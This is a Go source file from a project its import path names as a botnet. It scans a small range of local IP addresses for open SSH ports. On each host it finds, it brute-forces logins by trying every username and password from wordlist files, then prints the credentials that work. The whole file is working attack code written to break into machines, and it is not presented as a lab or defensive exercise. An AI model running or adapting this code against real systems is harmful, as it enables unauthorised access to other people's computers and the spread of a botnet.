package ssh

import (
	"fmt"
	"io/ioutil"
	"strings"

	"sync"

	"gitlab.com/rodzzlessa24/botnet/scanner"
	"golang.org/x/crypto/ssh"
)

// Attack holds all the shared properties needed to attack a SSH connection
type Attack struct {
	// UsernameFile is the path to usernames file
	UsernameFile string
	// PasswordFileis the path to password file
	PasswordFile string

	wg *sync.WaitGroup
}

type credentials struct {
	username string
	password string
	host     string
	port     string
}

// Run is
func (a *Attack) Run() {
	if a.wg == nil {
		a.wg = new(sync.WaitGroup)
	}

	var hs []string

	for i := 0; i < 7; i++ {
		hs = append(hs, fmt.Sprintf("192.168.0.%d", i))
	}

	hosts := scanner.ScanHosts(hs)

	// check if ip address has port 22 for ssh
	for _, host := range hosts {
		port := strings.Split(host, ":")[1]
		if port == "22" {
			fmt.Println("[*] starting brute force for", host)
			a.wg.Add(1)
			go a.bruteForce(host)
		}
	}

	a.wg.Wait()
}

// BruteForce is
func (a *Attack) bruteForce(host string) {
	defer a.wg.Done()

	usernames, err := getContent(a.UsernameFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	passwords, err := getContent(a.PasswordFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	var found = false
	c := new(credentials)
	for _, u := range usernames {
		found = false
		for _, p := range passwords {
			if err := a.login(host, u, p); err != nil {
				continue
			}
			c = &credentials{
				username: u,
				password: p,
				host:     host,
			}

			found = true
			break
		}

		if found {
			break
		}
	}

	fmt.Println(c)
}

// Login is
func (a *Attack) login(host, username, password string) error {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
	}

	_, err := ssh.Dial("tcp", host, config)
	if err != nil {
		return err
	}

	return nil
}

func getContent(file string) ([]string, error) {
	f, err := ioutil.ReadFile(file)
	if err != nil {
		return []string{}, fmt.Errorf("error opening file %v", err)
	}

	results := strings.Split(string(f), "\n")

	return results, nil
}
